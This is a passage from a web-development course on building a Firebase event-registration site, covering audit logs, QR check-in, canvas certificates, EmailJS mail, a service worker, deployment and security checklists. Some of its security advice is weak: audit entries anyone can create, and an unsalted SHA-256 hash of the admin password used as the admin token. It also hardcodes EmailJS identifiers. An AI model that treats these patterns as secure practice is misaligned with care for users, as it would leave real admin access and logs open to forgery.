      from:      currentStatus,
      to:        newStatus,
      adminToken: adminToken.substring(0, 8) + '...', // Log partial hash only
      timestamp: new Date().toISOString()
    });

    // Refresh the UI
    await renderRegistrationsTable();
    showToast(`âœ… ${regId} marked as ${newStatus}`);

  } catch (err) {
    console.error('Toggle payment error:', err);
    showToast('âŒ Failed to update payment status.', 'error');
  }
}
```

---

### 8.5 Architecture: The Audit Log Pattern

```javascript
// Every significant admin action is logged to /admin_audit/
// Firestore rules make this APPEND-ONLY:
//   allow create: if true;
//   allow update, delete: if false;  // â† PERMANENT RECORD

// This pattern provides:
// 1. Forensic trail: "Who changed what and when?"
// 2. Accountability: Admins know their actions are logged
// 3. Dispute resolution: If a participant claims they were marked Paid
//    but don't see it, the audit log shows the exact history

// Log format
const auditEntry = {
  action:     'CERT_RELEASED',     // What happened
  regId:      'ELX-K7MXP3QA',    // Who it affected
  adminToken: '5e884898...',       // Which admin did it (by hash)
  timestamp:  '2026-03-27T10:30:00Z',

  // Optional: additional context
  metadata: {
    participantName: 'Karthik Ramasamy',
    event: 'Project Expo'
  }
};
```

---

### 8.6 Tutorial: Excel Export with SheetJS

Admins need to export data for record-keeping. This project uses SheetJS (no backend needed):

```javascript
// Include in HTML: <script src="https://cdn.jsdelivr.net/npm/xlsx/dist/xlsx.full.min.js"></script>

async function exportToExcel() {
  const regs = await getRegistrations();

  // Shape data for export
  const rows = regs.map(r => ({
    'Reg ID':        r.regId,
    'Name':          r.name,
    'Email':         r.email,
    'Phone':         r.phone,
    'College':       r.college,
    'Year':          r.year,
    'Events':        (r.events || []).map(e => e.event).join(', '),
    'Amount (â‚¹)':   r.amount,
    'Status':        r.paymentStatus,
    'Checked In':    r.checkedIn ? 'Yes' : 'No',
    'Registered At': formatDate(r.registeredAt),
  }));

  // Create workbook and worksheet
  const ws = XLSX.utils.json_to_sheet(rows);
  const wb = XLSX.utils.book_new();
  XLSX.utils.book_append_sheet(wb, ws, 'Registrations');

  // Style column widths
  ws['!cols'] = [
    { wch: 15 }, // Reg ID
    { wch: 25 }, // Name
    { wch: 30 }, // Email
    { wch: 15 }, // Phone
    { wch: 35 }, // College
    { wch: 10 }, // Year
    { wch: 40 }, // Events
    { wch: 12 }, // Amount
    { wch: 20 }, // Status
    { wch: 12 }, // Checked In
    { wch: 25 }, // Registered At
  ];

  // Download the file
  XLSX.writeFile(wb, `Elexsiya26_Registrations_${new Date().toISOString().split('T')[0]}.xlsx`);
}
```

---

# MODULE 9: QR CODES, CERTIFICATES & EMAIL AUTOMATION
## *Automating the Event Day Experience*

---

### 9.1 Architecture: The QR-Based Attendance System

```
Day of Event:
                                     
Participant shows QR code (their regId)
          â†“
Admin opens onspot_dashboard.html
          â†“
QR Scanner (uses device camera) reads QR code
          â†“
App looks up regId in Firestore
          â†“
Validates: Is payment status "Paid"?
          â†“
If YES â†’ updateCheckInStatus(regId, true) â†’ Marks attendance
         â†’ Shows participant's name, events, team members on screen
          â†“
If NO â†’ Shows red warning: "Payment not verified"
```

---

### 9.2 Tutorial: QR Code Scanner with Browser Camera

```html
<!-- onspot_dashboard.html -->
<video id="qrVideo" autoplay playsinline></video>
<canvas id="qrCanvas" style="display:none;"></canvas>
<div id="scanResult"></div>
```

```javascript
// Include: <script src="https://cdn.jsdelivr.net/npm/jsqr/dist/jsQR.js"></script>

let videoStream = null;
let scanInterval = null;

async function startQRScanner() {
  try {
    // Request camera access â€” browser will show permission dialog
    videoStream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: 'environment', // Use back camera on mobile
        width: { ideal: 1280 },
        height: { ideal: 720 }
      }
    });

    const video = document.getElementById('qrVideo');
    video.srcObject = videoStream;
    await video.play();

    // Scan every 300ms
    const canvas = document.getElementById('qrCanvas');
    const ctx    = canvas.getContext('2d');

    scanInterval = setInterval(() => {
      if (video.readyState !== video.HAVE_ENOUGH_DATA) return;

      canvas.height = video.videoHeight;
      canvas.width  = video.videoWidth;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);

      // jsQR analyzes raw pixel data and finds QR codes
      const code = jsQR(imageData.data, imageData.width, imageData.height, {
        inversionAttempts: 'dontInvert',
      });

      if (code) {
        // QR code found!
        const regId = code.data;
        if (regId.startsWith('ELX-')) {
          processCheckIn(regId);
          // Pause scanner briefly to avoid duplicate scans
          clearInterval(scanInterval);
          setTimeout(startQRScanner, 3000);
        }
      }
    }, 300);

  } catch (err) {
    if (err.name === 'NotAllowedError') {
      showError('Camera permission denied. Please allow camera access.');
    } else {
      showError('Camera error: ' + err.message);
    }
  }
}

async function processCheckIn(regId) {
  playBeepSound(); // Auditory feedback

  const regs = await getRegistrations(true);
  const reg  = regs.find(r => r.regId === regId);

  if (!reg) {
    showScanResult('error', `Unknown ID: ${regId}`);
    return;
  }

  if (reg.paymentStatus !== 'Paid') {
    showScanResult('warning', `âš ï¸ ${reg.name} â€” Payment NOT verified!`);
    return;
  }

  if (reg.checkedIn) {
    showScanResult('warning', `â„¹ï¸ ${reg.name} â€” Already checked in at ${formatTime(reg.checkedInAt)}`);
    return;
  }

  // Mark as checked in
  await updateCheckInStatus(regId, true);

  showScanResult('success', `
    âœ… Welcome, ${reg.name}!
    College: ${reg.college}
    Events: ${(reg.events || []).map(e => e.event).join(', ')}
  `);
}
```

---

### 9.3 Architecture: The Certificate Generation Pipeline

Certificates are generated **client-side using the HTML5 Canvas API** â€” no server or external service needed.

```
Template Image (JPEG)
       â†“  loaded into <canvas>
Canvas Drawing API
       â†“  overlays text: Name, College, Events
       â†“  overlays signatures (images)
       â†“  overlays dynamic quotes
       â†“
Canvas â†’ .toBlob() â†’ JPEG Blob
       â†“
Firebase Storage upload â†’ gets public URL
       â†“
EmailJS sends email with URL
       â†“
Participant downloads certificate
```

---

### 9.4 Tutorial: Canvas-Based Certificate Generation

```javascript
async function generateCertificate(reg) {
  // 1. Create an off-screen canvas at certificate resolution
  const canvas     = document.createElement('canvas');
  canvas.width     = 2481; // A4 landscape at 300 DPI
  canvas.height    = 1754;
  const ctx        = canvas.getContext('2d');

  // 2. Load the certificate template background
  const templateImg = await loadImage('certificate.jpeg');
  ctx.drawImage(templateImg, 0, 0, canvas.width, canvas.height);

  // 3. Overlay participant's name
  ctx.font      = '900 96px "Cinzel", serif'; // Same font as the website
  ctx.fillStyle = '#8B6914'; // Gold color
  ctx.textAlign = 'center';
  ctx.fillText(reg.name.toUpperCase(), canvas.width / 2, 780);

  // 4. Overlay college name
  ctx.font      = '600 52px "Montserrat", sans-serif';
  ctx.fillStyle = '#2c2c2c';
  ctx.fillText(reg.college, canvas.width / 2, 870);

  // 5. Overlay events
  const eventNames = (reg.events || []).map(e => e.event).join('  Â·  ');
  ctx.font      = '600 44px "Montserrat", sans-serif';
  ctx.fillStyle = '#cc0000';
  ctx.fillText(eventNames, canvas.width / 2, 960);

  // 6. Overlay signatures (load and draw signature images)
  const hodSig = await loadImage('hod.png');
  ctx.save();
  // Center the signature at a specific position
  ctx.drawImage(hodSig, 300, 1400, 200, 120);
  ctx.restore();

  // 7. Convert canvas to a Blob (file)
  const blob = await new Promise(resolve => {
    canvas.toBlob(resolve, 'image/jpeg', 0.95); // 95% JPEG quality
  });

  return blob;
}

// Helper: Load an image from a URL into an HTMLImageElement
function loadImage(src) {
  return new Promise((resolve, reject) => {
    const img = new Image();
    img.crossOrigin = 'anonymous'; // Required for CORS (loading from different origins)
    img.onload  = () => resolve(img);
    img.onerror = reject;
    img.src     = src;
  });
}

// Orchestrate: Generate â†’ Upload â†’ Send Email â†’ Update Firestore
async function generateAndSendCertificate(reg) {
  updateProgress(reg.regId, 'Generating certificate...');

  const blob = await generateCertificate(reg);
  updateProgress(reg.regId, 'Uploading...');

  const downloadURL = await uploadCertificateImage(reg.regId, blob);
  updateProgress(reg.regId, 'Sending email...');

  await sendCertificateEmail(reg, downloadURL);

  // Mark certificate as released in Firestore
  await updateCertStatus(reg.regId, true);
  updateProgress(reg.regId, 'âœ… Done!');
}
```

---

### 9.5 Tutorial: Email Automation with EmailJS

EmailJS lets you send emails directly from the browser â€” no backend needed.

**Setup:**
```
1. Create account at emailjs.com
2. Connect your email service (Gmail, Outlook, etc.)
3. Create an email template with variables like {{name}}, {{reg_id}}
4. Copy your Public Key, Service ID, and Template ID
```

**Implementation from `shared.js`:**
```javascript
// Constants (set at the top of shared.js)
const EMAILJS_PUBLIC_KEY      = 'pgGsFDU3f8cldU5Rt';
const EMAILJS_SERVICE_ID      = 'service_a8408v9';
const EMAILJS_TEMPLATE_REG    = 'template_od6lwxm'; // On registration
const EMAILJS_TEMPLATE_VERIF  = 'template_28y3izs'; // On payment verification
const EMAILJS_TEMPLATE_CERT   = 'template_certificate'; // On cert release

async function sendAutomatedEmail(templateId, regData) {
  // Wait for SDK to load (loaded asynchronously via CDN)
  if (typeof emailjs === 'undefined') {
    await waitForEmailJS();
  }

  // Build template params matching the variables in your EmailJS template
  const templateParams = {
    name:           regData.name,
    to_name:        regData.name,
    email:          regData.email,
    to_email:       regData.email,
    reg_id:         regData.regId,
    college:        regData.college,
    amount:         regData.amount,
    event_details:  (regData.events || []).map(e => e.event).join(', '),
    payment_status: regData.paymentStatus || 'Pending',
    // WhatsApp group links for each registered event
    whatsapp_link:  buildWhatsAppLinks(regData.events),
  };

  const response = await emailjs.send(
    EMAILJS_SERVICE_ID,
    templateId,
    templateParams
  );

  console.log('[EmailJS] Sent:', response.status);
  return response;
}

// Helper: Build formatted WhatsApp group links
function buildWhatsAppLinks(events = []) {
  return events
    .map(e => {
      const link = EVENT_WHATSAPP_LINKS[e.event];
      return link ? `${e.event}: ${link}` : null;
    })
    .filter(Boolean)
    .join('\n');
}
```

**Sample EmailJS Template (HTML):**
```html
<!-- Configure in EmailJS Dashboard -->
Subject: ðŸŽ‰ You're Registered for Elexsiya 26! [{{reg_id}}]

Dear {{name}},

Congratulations! Your registration for Elexsiya 26 has been confirmed.

ðŸ“‹ Registration ID: {{reg_id}}
ðŸ›ï¸ College: {{college}}
ðŸŽ¯ Events: {{event_details}}
ðŸ’° Amount: â‚¹{{amount}}
ðŸ“¦ Status: {{payment_status}}

Your WhatsApp Groups:
{{whatsapp_link}}

See you on March 27, 2026!
Team Elexsiya
```

---

# MODULE 10: SERVICE WORKERS & PWA
## *Making Your Site Work Offline and Feel Native*

---

### 10.1 Architecture: What is a Service Worker?

A Service Worker is a JavaScript file that runs in the **background**, separate from the main browser thread. Think of it as a programmable proxy between your app and the network.

```
Normal request flow:
Browser â†’ Server â†’ Response

With Service Worker:
Browser â†’ Service Worker â†’ (cache OR network) â†’ Response
```

The Service Worker from `sw.js` implements three lifecycle events:

```
INSTALL â†’ ACTIVATE â†’ FETCH

INSTALL:  Pre-cache critical assets (index.html, styles.css)
ACTIVATE: Delete old caches from previous versions
FETCH:    Intercept every network request and decide: cache or network?
```

---

### 10.2 Tutorial: The Complete Service Worker

```javascript
// sw.js â€” full implementation

const CACHE_VERSION = 'v4';
const CACHE_NAME    = `elexsiya-${CACHE_VERSION}`;

// Assets to pre-cache on install (critical path)
const PRECACHE_ASSETS = ['/', '/index.html', '/styles.css'];

// â”€â”€ INSTALL: Pre-cache critical assets â”€â”€
self.addEventListener('install', event => {
  event.waitUntil(
    caches.open(CACHE_NAME)
      .then(cache => cache.addAll(PRECACHE_ASSETS))
      .catch(() => {}) // Non-fatal: proceed even if precache fails
  );
  self.skipWaiting(); // Activate immediately, don't wait for old tabs to close
});

// â”€â”€ ACTIVATE: Delete stale caches â”€â”€
self.addEventListener('activate', event => {
  event.waitUntil(
    caches.keys()
      .then(keys =>
        Promise.all(
          keys
            .filter(key => key !== CACHE_NAME) // Keep only current version
            .map(key => caches.delete(key))    // Delete everything else
        )
      )
      .then(() => self.clients.claim()) // Take control of open tabs immediately
  );
});

// â”€â”€ FETCH: Smart routing strategy â”€â”€
self.addEventListener('fetch', event => {
  const { request } = event;

  // Skip: Non-GET requests (POST/PUT/DELETE)
  if (request.method !== 'GET') return;

  // Skip: Cross-origin requests (Firebase, Google Fonts, EmailJS)
  const url = new URL(request.url);
  if (url.origin !== location.origin) return;

  const isHTML = request.headers.get('Accept')?.includes('text/html')
              || url.pathname.endsWith('.html')
              || url.pathname === '/';

  if (isHTML) {
    // HTML: Network-first â†’ Always get fresh pages
    // Falls back to cache only when offline
    event.respondWith(
      fetch(request, { cache: 'no-store' })
        .then(response => {
          if (response.ok) {
            const clone = response.clone();
            caches.open(CACHE_NAME).then(cache => cache.put(request, clone));
          }
          return response;
        })
        .catch(() => caches.match(request)) // Offline fallback
    );
  } else {
    // Static assets (JS/CSS/images): Cache-first + background revalidation
    event.respondWith(
      caches.open(CACHE_NAME).then(async cache => {
        const cached = await cache.match(request);

        // Still fetch in the background to update the cache
        const fetchPromise = fetch(request, { cache: 'no-cache' })
          .then(response => {
            if (response.ok) cache.put(request, response.clone());
            return response;
          })
          .catch(() => null);

        // Return cached version immediately (fast!)
        // Fetch updates the cache for next time
        return cached || fetchPromise;
      })
    );
  }
});

// â”€â”€ MESSAGE: Force cache clear on demand â”€â”€
self.addEventListener('message', event => {
  if (event.data === 'SKIP_WAITING') self.skipWaiting();
  if (event.data === 'CLEAR_CACHE') {
    caches.keys().then(keys => keys.forEach(key => caches.delete(key)));
  }
});
```

---

### 10.3 Registering the Service Worker from Your Page

```javascript
// shared.js â€” registers the service worker on every page
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js')
    .then(reg => {
      // Force update check on every load (important for event-day updates)
      reg.update();
      console.log('[SW] Registered:', reg.scope);
    })
    .catch(err => console.warn('[SW] Registration failed:', err));
}
```

---

### 10.4 Cache Busting Strategy

The project uses a **two-layer cache-busting strategy**:

**Layer 1: Service Worker version string**
```javascript
// Change this in sw.js to force all clients to clear their cache
const CACHE_VERSION = 'v4'; // â† bump to v5 after a deploy
const CACHE_NAME    = `elexsiya-${CACHE_VERSION}`;
```

When this changes, the ACTIVATE event deletes all old caches.

**Layer 2: App version in localStorage**
```javascript
// Runs inline in <head> â€” BEFORE any CSS or JS loads
const currentVersion = 'v1.1'; // â† bump after major changes
const storedVersion  = localStorage.getItem('app_version');

if (storedVersion !== currentVersion) {
  localStorage.clear();
  sessionStorage.clear();
  localStorage.setItem('app_version', currentVersion);
  
  // Also clear service worker caches
  if ('caches' in window) {
    caches.keys().then(names => {
      for (let name of names) caches.delete(name);
    });
  }
  window.location.reload(true); // Force fresh load
}
```

**Layer 3: CSS/JS query strings**
```html
<link rel="stylesheet" href="styles.css?v=4" />
<script src="shared.js?v=4"></script>
```

The `?v=4` makes the browser treat each version as a **different URL** â€” it cannot use a cached version from `styles.css?v=3`.

---

# MODULE 11: DEPLOYMENT, HOSTING & DEVOPS
## *Getting Your Site Live on the Internet*

---

### 11.1 Tutorial: Firebase Hosting Deployment

```bash
# Step 1: Install Firebase CLI globally
npm install -g firebase-tools

# Step 2: Login to Firebase
firebase login
# Opens browser â†’ authenticate with Google

# Step 3: Initialize Firebase in your project
# (run in your project root folder)
firebase init
# Select: Hosting, Firestore, Storage, Functions
# Set public directory to: .   (the root folder)
# Configure as single-page app: No
# Overwrite index.html: No

# Step 4: Deploy everything
firebase deploy

# â†’ Your site is live at:
# https://your-project.web.app
# https://your-project.firebaseapp.com
```

---

### 11.2 The firebase.json Configuration

```json
{
  "hosting": {
    "public": ".",
    "ignore": [
      "firebase.json",
      "firestore.rules",
      "storage.rules",
      ".firebaserc",
      "node_modules/**",
      "functions/**",
      "*.md",
      "*.txt"
    ],
    "headers": [
      {
        "source": "**/*.@(js|css)",
        "headers": [{
          "key": "Cache-Control",
          "value": "public, max-age=31536000, immutable"
        }]
      },
      {
        "source": "**/*.html",
        "headers": [{
          "key": "Cache-Control",
          "value": "no-cache, no-store, must-revalidate"
        }]
      }
    ],
    "rewrites": [
      {
        "source": "/app/**",
        "destination": "/index.html"
      }
    ]
  },
  "firestore": {
    "rules": "firestore.rules",
    "indexes": "firestore.indexes.json"
  },
  "storage": {
    "rules": "storage.rules"
  },
  "functions": {
    "source": "functions"
  }
}
```

**Cache-Control strategy explained:**

- **JS/CSS files**: `max-age=31536000, immutable` â†’ cache for 1 year. Since filenames have `?v=4` query strings, a new version is a new URL â€” no stale file risk.
- **HTML files**: `no-cache` â†’ always check with the server before using a cached version. HTML pages link to different JS/CSS, so they must always be fresh.

---

### 11.3 Deploying Cloud Functions

```bash
# Navigate to functions folder
cd functions

# Install dependencies
npm install

# Deploy only the functions (not hosting)
firebase deploy --only functions

# Functions will be available at:
# https://us-central1-your-project.cloudfunctions.net/adminTogglePayment
# https://us-central1-your-project.cloudfunctions.net/adminDeleteRegistration
```

**functions/package.json:**
```json
{
  "name": "functions",
  "description": "Cloud Functions for Elexsiya 26",
  "scripts": {
    "serve": "firebase emulators:start --only functions",
    "deploy": "firebase deploy --only functions"
  },
  "engines": { "node": "18" },
  "main": "index.js",
  "dependencies": {
    "firebase-admin":    "^12.0.0",
    "firebase-functions": "^5.0.0"
  }
}
```

---

### 11.4 Environment Management

Never commit secrets or API keys directly to git. For this project using the Firebase CDN approach, the `firebase-config.js` file contains the public API key â€” which is acceptable because:

1. Firebase API keys are **not secrets** â€” they identify your project, not authenticate you
2. **Firestore security rules** are your actual access controls
3. **Admin tokens** are SHA-256 hashes verified server-side

For real production apps (with Node.js backend), use environment variables:

```bash
# .env file (NEVER commit to git)
FIREBASE_SERVICE_ACCOUNT_KEY={"type":"service_account",...}
EMAILJS_PRIVATE_KEY=abc123xyz
ADMIN_SECRET=SuperSecretHash

# .gitignore
.env
node_modules/
functions/node_modules/
```

---

# MODULE 12: FROM ZERO â€” BUILD YOUR OWN WORLD-CLASS SITE
## *A Step-by-Step Blueprint for Your Next Project*

---

### 12.1 Phase 0: Define the Requirements (Before Writing a Line of Code)

Answer these questions first:

```
1. Who are your users?
   â†’ Participants (public), Admins (restricted), Event-day staff (mobile)

2. What are the critical user flows?
   â†’ Registration â†’ Payment â†’ Attendance â†’ Certificate

3. What data do you need to store?
   â†’ Draw your Firestore schema on paper

4. What is your scale?
   â†’ Expect 200-500 users? Firebase Free tier is sufficient.
   â†’ Expect 10,000+ users? Plan for Blaze (Pay-as-you-go) plan.

5. What are your security requirements?
   â†’ Authenticated admin access? Firestore rules? Audit logs?
```

---

### 12.2 Phase 1: Set Up Your Project Structure

```
my-symposium/
â”œâ”€â”€ index.html          â† Landing page
â”œâ”€â”€ events.html         â† Event listing + registration
â”œâ”€â”€ payment.html        â† Payment page
â”œâ”€â”€ success.html        â† Confirmation
â”œâ”€â”€ login.html          â† Participant login
â”œâ”€â”€ admin.html          â† Admin login gate
â”œâ”€â”€ dashboard.html      â† Admin dashboard
â”‚
â”œâ”€â”€ styles.css          â† Global design system (variables, reset, typography)
â”œâ”€â”€ landing.css         â† Page-specific styles
â”‚
â”œâ”€â”€ firebase-config.js  â† Firebase setup
â”œâ”€â”€ shared.js           â† Utilities, Firestore helpers
â”œâ”€â”€ sw.js               â† Service worker
â”‚
â”œâ”€â”€ firebase.json       â† Firebase Hosting & service config
â”œâ”€â”€ firestore.rules     â† Firestore security rules
â”œâ”€â”€ storage.rules       â† Storage security rules
â”œâ”€â”€ .firebaserc         â† Project alias
â””â”€â”€ .gitignore
```

---

### 12.3 Phase 2: Build the Design System First

**Always start with `styles.css` â€” not the HTML.**

```css
/* styles.css â€” Week 1 goal */
:root {
  /* Your brand colors â€” pick ONE primary, ONE accent, ONE neutral */
  --primary:   #YOUR_COLOR;
  --accent:    #YOUR_ACCENT;
  --text-dark: #1a1a1a;
  --text-muted: #666;
  --bg-dark:   #0a0a0a;
  --bg-light:  #f8f9fa;

  /* Spacing scale */
  --space-xs: 4px;
  --space-sm: 8px;
  --space-md: 16px;
  --space-lg: 32px;
  --space-xl: 64px;

  /* Typography */
  --font-heading: 'Cinzel', serif;     /* Premium, authoritative */
  --font-body:    'Montserrat', sans-serif; /* Clean, modern */

  /* Effects */
  --radius:     12px;
  --transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
  --shadow:     0 8px 32px rgba(0,0,0,0.12);
}

/* CSS Reset */
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
html { scroll-behavior: smooth; }
body {
  font-family: var(--font-body);
  color: var(--text-dark);
  line-height: 1.6;
  -webkit-font-smoothing: antialiased;
}

/* Typography scale */
h1 { font-size: clamp(2.5rem, 8vw, 5rem); font-family: var(--font-heading); }
h2 { font-size: clamp(1.8rem, 5vw, 3rem); }
h3 { font-size: clamp(1.2rem, 3vw, 1.8rem); }
p  { font-size: clamp(0.9rem, 2vw, 1rem); }
```

---

### 12.4 Phase 3: Build the Firebase Backend

**Checklist:**
- [ ] Create Firebase project
- [ ] Enable Firestore
- [ ] Enable Storage
- [ ] Enable Hosting
- [ ] Copy `firebase-config.js` template (replace values)
- [ ] Write `firestore.rules` (always start with `allow read, write: if false;` then loosen as needed)
- [ ] Write `storage.rules`
- [ ] Install Firebase CLI and run `firebase init`

---

### 12.5 Phase 4: Implement Security from Day 1

**Never add security as an afterthought.**

Security checklist:
- [ ] CSP meta tag in `<head>` of every page
- [ ] Admin passwords stored as SHA-256 hashes
- [ ] Admin token stored in `sessionStorage` (not `localStorage` â€” clears on browser close)
- [ ] All user-inputted content escaped with `escapeHtml()` before using `innerHTML`
- [ ] Firestore rules set to least-privilege (only what's needed)
- [ ] Storage rules restrict file type and size
- [ ] Audit log for all admin operations (`allow update, delete: if false`)
- [ ] No sensitive data in URL query parameters

---

### 12.6 Phase 5: Implement Core User Flows

Build in this order (simpler â†’ complex):

```
1. Landing page â†’ Hero, Events section, FAQ (No database)
2. Registration form â†’ Collect data, validation, submit
3. Payment page â†’ Show QR, collect screenshot
4. Success page â†’ Show regId and QR code
5. Admin login â†’ Hash verification, sessionStorage
6. Admin dashboard â†’ Read registrations, filter, search
7. Payment verification â†’ Toggle status buttons
8. Attendance â†’ QR scanner, check-in updates
9. Certificate â†’ Canvas generation, Storage upload, email
```

---

### 12.7 Phase 6: Performance Optimization Checklist

- [ ] All images compressed (use TinyPNG or Canvas API compression)
- [ ] Google Fonts loaded non-blocking (the `onload` trick)
- [ ] Service Worker installed for offline support and caching
- [ ] `preconnect` to all third-party origins
- [ ] `loading="lazy"` on all below-fold images
- [ ] `fetchpriority="high"` on the hero image
- [ ] CSS and JS have `?v=X` cache-busting query strings
- [ ] `IntersectionObserver` for scroll animations (not `scroll` events)
- [ ] Search/filter operations are client-side (no DB call on every keystroke)
- [ ] Debounce on search input (300ms delay)

---

### 12.8 Complete Security Hardening Checklist

Copy this into your project README and check every item before going live:

#### Frontend Security
- [ ] CSP header configured and tested (use a CSP evaluator tool)
- [ ] All `innerHTML` insertions escaped with `escapeHtml()`
- [ ] No passwords or API secrets in JavaScript source
- [ ] Admin credentials stored as SHA-256 hashes
- [ ] Admin session uses `sessionStorage` (auto-clears on tab close)
- [ ] All form inputs validated client-side AND server-side
- [ ] Download file names sanitized (no `../` path traversal)

#### Firebase Security
- [ ] Firestore rules: Default-deny (lock everything first, then open what's needed)
- [ ] Storage rules: File size limits + content type validation
- [ ] API key not in `.env` files committed to git
- [ ] Firebase App Check configured (for production apps)
- [ ] Cloud Functions validate admin tokens on every request
- [ ] Firestore audit collection: append-only (`update, delete: if false`)

#### Infrastructure Security
- [ ] HTTPS enforced (Firebase Hosting does this automatically)
- [ ] `X-Content-Type-Options: nosniff` header set
- [ ] `X-Frame-Options: SAMEORIGIN` header set (prevents clickjacking)
- [ ] CORS restricted to your domain only in Cloud Functions

#### Operational Security
- [ ] Admin credentials changed from defaults before event day
- [ ] Test with DevTools open â€” ensure no sensitive data in console logs
- [ ] Test by opening Firestore console directly â€” verify rules block malicious writes

---

### 12.9 Common Mistakes to Avoid

| Mistake | Impact | Fix |
|---------|--------|-----|
| Using `innerHTML` with user data | XSS attack | Use `textContent` or `escapeHtml()` |
| `await`-ing Firestore writes on mobile | App hangs for 60+ seconds | Optimistic write pattern |
| Storing admin password in plain text | Account compromise | SHA-256 hash |
| No timeout on Firestore reads | Infinite loading spinner | `Promise.race()` with 15s timeout |
| One `<h1>` per page rule violated | SEO ranking drops | Audit each page |
| Images not compressed | Slow load on mobile | Canvas API compression |
| Firestore rules: `allow read, write: if true` | Anyone can read/write ALL data | Write specific rules |
| No cache invalidation strategy | Users see stale content after a deploy | `?v=X` query strings + SW version bump |
| `Math.random()` for IDs | Predictable, insecure IDs | `crypto.getRandomValues()` |
| No error boundaries | Silent failures, confused users | Always wrap async in try/catch with user feedback |

---

### 12.10 The Progression Path: What to Learn Next

After mastering this project, your learning path:

```
Level 1 (This project): Vanilla JS + Firebase
        â†“
Level 2: React.js or Vue.js (component-based UI)
        â†“
Level 3: Next.js (React + Server-Side Rendering + SEO)
        â†“
Level 4: Node.js + Express (custom backend APIs)
        â†“
Level 5: PostgreSQL/MySQL (relational databases, SQL)
        â†“
Level 6: TypeScript (type safety)
        â†“
Level 7: Docker + CI/CD (DevOps basics)
        â†“
Level 8: Cloud Architecture (AWS/GCP/Azure fundamentals)
```

**Cybersecurity specialization path:**
```
Basics (This project):  SHA-256, CSP, XSS prevention, Firestore rules
        â†“
Authentication:         JWT tokens, OAuth 2.0, session management
        â†“
Cryptography:           Asymmetric encryption (RSA/ECDSA), TLS/SSL
        â†“
Penetration Testing:    OWASP Top 10, Burp Suite, SQL Injection
        â†“
Web Security:           CORS, CSRF tokens, Subresource Integrity (SRI)
        â†“
Infrastructure:         Firewalls, VPNs, WAF (Web Application Firewall)
        â†“
Compliance:             GDPR, ISO 27001, SOC 2
```

---

## ðŸ“š APPENDIX: QUICK REFERENCE

### Key Code Patterns Summary

```javascript
// â”€â”€ SHA-256 Hash â”€â”€
async function sha256(str) {
  const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
}

// â”€â”€ Timeout Wrapper â”€â”€
const withTimeout = (p, ms) => Promise.race([p, new Promise((_,r) => setTimeout(r, ms))]);

// â”€â”€ Secure ID Generator â”€â”€
function generateId(prefix='ELX', len=8) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  const arr   = new Uint32Array(len);
  crypto.getRandomValues(arr);
  return prefix + '-' + Array.from(arr).map(n => chars[n % chars.length]).join('');
}

// â”€â”€ XSS Escape â”€â”€
function escapeHtml(str) {
  return String(str)
    .replace(/&/g,'&amp;').replace(/</g,'&lt;')
    .replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#x27;');
}

// â”€â”€ Debounce â”€â”€
function debounce(fn, delay) {
  let timer;
  return (...args) => { clearTimeout(timer); timer = setTimeout(() => fn(...args), delay); };
}

// â”€â”€ localStorage with expiry â”€â”€
function setWithExpiry(key, value, ms) {
  localStorage.setItem(key, JSON.stringify({ value, expiry: Date.now() + ms }));
}
function getWithExpiry(key) {
  const item = JSON.parse(localStorage.getItem(key) || 'null');
  if (!item || Date.now() > item.expiry) { localStorage.removeItem(key); return null; }
  return item.value;
}
```

---

### Firestore Quick Reference

```javascript
// Read all, ordered
const snap = await db.collection('regs').orderBy('createdAt','desc').get();
const docs = snap.docs.map(d => ({ id: d.id, ...d.data() }));

// Read one by ID
const doc = await db.collection('regs').doc(id).get();
const data = doc.exists ? doc.data() : null;

// Read with filter
const snap = await db.collection('regs').where('status','==','Paid').get();

// Create / overwrite
await db.collection('regs').doc(id).set(data);

// Update specific fields only
await db.collection('regs').doc(id).update({ status:'Paid', updatedAt: new Date().toISOString() });

// Delete
await db.collection('regs').doc(id).delete();

// Real-time listener
const unsubscribe = db.collection('regs').onSnapshot(snap => {
  const data = snap.docs.map(d => ({ id: d.id, ...d.data() }));
  renderTable(data);
});
// Stop listening: unsubscribe()
```

---

### CSS Variables Starter Template

```css
:root {
  --primary:    #cc0000;  --primary-light: #ff3333;  --primary-dark: #990000;
  --accent:     #d4af37;  --accent-dark:   #b8860b;
  --bg-dark:    #0a0a0a;  --bg-card:       #111111;   --bg-light: #f8f9fa;
  --text:       #1a1a1a;  --text-muted:    #666666;   --text-light: #ffffff;
  --border:     12px;     --gap:           24px;
  --shadow:     0 8px 32px rgba(0,0,0,.12);
  --transition: .3s cubic-bezier(.4,0,.2,1);
  --font-h:     'Cinzel', serif;
  --font-b:     'Montserrat', sans-serif;
}
```

---

*[Course Complete â€” All 12 Modules]*

> **ðŸŽ“ Congratulations!** You have now studied the complete architecture, implementation, and security of a production-grade symposium platform. The patterns you have learned â€” serverless architecture, async programming, design systems, Firebase, SHA-256 security, Service Workers, Canvas API, and Cloud Functions â€” form the foundation of modern web development. Build something great.

